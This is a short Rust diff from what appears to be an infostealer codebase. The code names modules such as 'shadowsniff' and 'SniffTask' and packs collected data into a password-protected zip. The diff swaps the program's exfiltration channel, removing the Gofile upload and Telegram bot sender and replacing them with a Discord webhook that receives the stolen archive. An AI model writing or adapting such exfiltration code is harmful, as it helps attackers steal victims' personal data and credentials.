@@ -18,8 +18,7 @@ use filesystem::FileSystem;
 use ipinfo::init_ip_info;
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
-use sender::gofile::Gofile;
-use sender::telegram_bot::TelegramBot;
+use sender::discord_webhook::DiscordWebhook;
 use sender::LogSender;
 use shadowsniff::SniffTask;
 use tasks::Task;
@@ -75,9 +74,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
-    let telegram = TelegramBot::new(Arc::from(env!("TELEGRAM_CHAT_ID")), Arc::from(env!("TELEGRAM_BOT_TOKEN")));
-
-    Gofile::new(telegram)
+    DiscordWebhook::new(Arc::from(env!("DISCORD_WEBHOOK")))
         .send(zip.into(), Some(password), &collector)
         .unwrap();
 
